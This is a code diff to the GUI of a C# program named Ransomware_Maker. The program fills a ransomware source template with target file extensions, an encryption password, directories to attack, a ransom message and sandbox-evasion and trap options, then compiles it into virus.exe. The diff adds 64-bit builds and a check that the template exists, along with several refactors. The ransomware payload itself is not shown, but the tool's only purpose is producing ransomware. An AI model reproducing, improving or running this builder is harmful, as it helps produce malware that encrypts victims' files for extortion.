@@ -18,6 +18,11 @@ namespace Ransomware_Maker.cs
         public MainWindow()
         {
             InitializeComponent();
+            if (!(File.Exists("virus.cc") || File.Exists("virus.cs")))
+            {
+                MessageBox.Show("source code not found.",Title,MessageBoxButton.OK,MessageBoxImage.Error);
+                Application.Current.Shutdown(1);
+            }
         }
         private static string GetCscCompiler(string bit = "Framework")
         {
@@ -50,7 +55,6 @@ namespace Ransomware_Maker.cs
         }
         private void Rdb_cpp_Checked(object sender, RoutedEventArgs e)
         {
-            chk_64bit.IsEnabled = false;
             OpenFileDialog openFileDialog = new()
             {
                 Filter = "Executable Files|g++.exe",
@@ -82,7 +86,6 @@ namespace Ransomware_Maker.cs
         }
         private void Rdb_cs_Checked(object sender, RoutedEventArgs e)
         {
-            chk_64bit.IsEnabled = true;
             lbl_compiler.Content = GetCscCompiler();
         }
 
@@ -93,14 +96,15 @@ namespace Ransomware_Maker.cs
 
         private void Btn_generate_Click(object sender, RoutedEventArgs e)
         {
-            string lang = rdb_cs.IsChecked.Value? "c#" : "c++";
+            string lang = rdb_cs.IsChecked == true ? "c#" : "c++";
             string suffix = lang == "c#" ? "cs" : "cc";
             string? path = GenerateCode(lang == "c#" ? "virus.cs" : "virus.cc", suffix);
             if(path == null )
             {
                 MessageBox.Show("An error occurred while generating the code", Title, MessageBoxButton.OK, MessageBoxImage.Error);
+                return;
             }
-            bool smallest = chk_resize.IsChecked.Value;
+            bool smallest = chk_resize.IsChecked == true;
             string outputOption = lang switch
             {
                 "c#" => " /out:virus.exe ",
@@ -112,12 +116,13 @@ namespace Ransomware_Maker.cs
             if (string.Empty == result)
             {
                 MessageBox.Show("Compiled successfully", Title, MessageBoxButton.OK, MessageBoxImage.Information);
-            }else
+            }
+            else
             {
                 MessageBox.Show(result, Title, MessageBoxButton.OK, MessageBoxImage.Error);
             }
         }
-        static string AddArgv(string langType, bool smallest)
+        string AddArgv(string langType, bool smallest)
         {
             string result = langType switch
             {
@@ -133,14 +138,21 @@ namespace Ransomware_Maker.cs
                     "c++" => " -s ",
                 };
             }
-
+            if (chk_64bit.IsChecked==true)
+            {
+                result += langType switch
+                {
+                    "c#" => " /platform:x64 ",
+                    "c++" => " -m64 ",
+                };
+            }
 
             return result;
         }
 
         static string ExecCmd(string cmd)
             {
-                ProcessStartInfo psi = new ProcessStartInfo
+                ProcessStartInfo psi = new()
                 {
                     FileName = "cmd.exe",
                     RedirectStandardOutput = true,
@@ -153,7 +165,7 @@ namespace Ransomware_Maker.cs
             using Process process = new();
             process.StartInfo = psi;
             process.Start();
-            string output = process.StandardError.ReadToEnd() + process.StandardOutput.ReadToEnd();
+            string output =process.StandardOutput.ReadToEnd().Trim()+process.StandardError.ReadToEnd().Trim();
             process.WaitForExit();
             if (process.ExitCode != 0)
             {
@@ -162,15 +174,13 @@ namespace Ransomware_Maker.cs
             return string.Empty;
         }
 
-    private string? GenerateCode(string path,string suffix)
+        private string? GenerateCode(string path,string suffix)
         {
             string data = "";
             try
             {
-                using (StreamReader reader = new StreamReader(path))
-                {
-                    data = reader.ReadToEnd();
-                }
+                using StreamReader reader = new(path);
+                data = reader.ReadToEnd();
             }
             catch
             {
@@ -193,15 +203,15 @@ namespace Ransomware_Maker.cs
             string formattedDirectories = string.Join(",", directories.Select(directory => $"\"{directory.Trim()}\""));
             static string lambdaFunction(bool x) => x ? "true" : "false";
             string msg = tbox_warning.Text;
-            string sandbox = lambdaFunction(chk_sandbox.IsChecked.Value);
-            string trap = lambdaFunction(chk_trap.IsChecked.Value);
+            string sandbox = lambdaFunction(chk_sandbox.IsChecked == true);
+            string trap = lambdaFunction(chk_trap.IsChecked == true);
 
             Tuple<string, string>[] replacements = new Tuple<string, string>[]
             {
                 new Tuple<string, string>(formattedSuffixes, "#SUFFIES#"),
                 new Tuple<string, string>($"\"{encryptedSuffixes}\"", "#ENCRYPTED_SUFFIX#"),
                 new Tuple<string, string>($"{Escape(password)}", "#PASSWORD#"),
-                new Tuple<string, string>($"{Escape(formattedDirectories)}", "#DIRECTORIES#"),
+                new Tuple<string, string>($"{formattedDirectories}", "#DIRECTORIES#"),
                 new Tuple<string, string>($"{Escape(msg)}", "#MSG#"),
                 new Tuple<string, string>(sandbox, "#SANDBOX#"),
                 new Tuple<string, string>(trap, "#TRAP#")
@@ -212,14 +222,14 @@ namespace Ransomware_Maker.cs
                 data = data.Replace(replacement.Item2, replacement.Item1);
             }
 
-            string randomStr = new string(Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 6)
+            string randomStr = new(Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 6)
                 .Select(s => s[new Random().Next(s.Length)]).ToArray());
 
             string tempPath = Path.GetTempPath();
 
             string filePath = Path.Combine(tempPath, $"{randomStr}.{suffix}");
 
-            using (StreamWriter writer = new StreamWriter(filePath))
+            using (StreamWriter writer = new(filePath))
             {
                 writer.Write(data);
             }
@@ -232,12 +242,14 @@ namespace Ransomware_Maker.cs
         }
         private void Chk_64bit_Checked(object sender, RoutedEventArgs e)
         {
-            lbl_compiler.Content = GetCscCompiler("Framework64");
+            if (rdb_cs.IsChecked == true)
+                lbl_compiler.Content = GetCscCompiler("Framework64");
         }
 
         private void Chk_64bit_Unchecked(object sender, RoutedEventArgs e)
         {
-            lbl_compiler.Content = GetCscCompiler();
+            if(rdb_cs.IsChecked==true)
+                lbl_compiler.Content = GetCscCompiler();
         }
 
     }
